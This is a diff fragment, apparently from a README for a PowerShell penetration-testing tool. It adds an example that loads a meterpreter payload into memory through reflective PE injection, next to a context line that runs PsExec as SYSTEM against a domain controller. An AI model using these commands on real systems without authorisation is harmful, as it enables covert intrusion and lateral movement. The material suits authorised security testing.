@@ -145,6 +145,12 @@ PS C:\Users\pentestuser> .\PsExec64.exe \\DC01.acme.local -s powershell -c '$K=n
 
 Getting the escape sequence on the quotes right can be tough...
 
+Let's say you want to execute a meterpreter in memory, then you do this:
+
+```
+PS C:\Users\pentestuser> lhm ReflectivePEInjection; lhm meterpreter.exe|re
+```
+
 Author
 ======
 
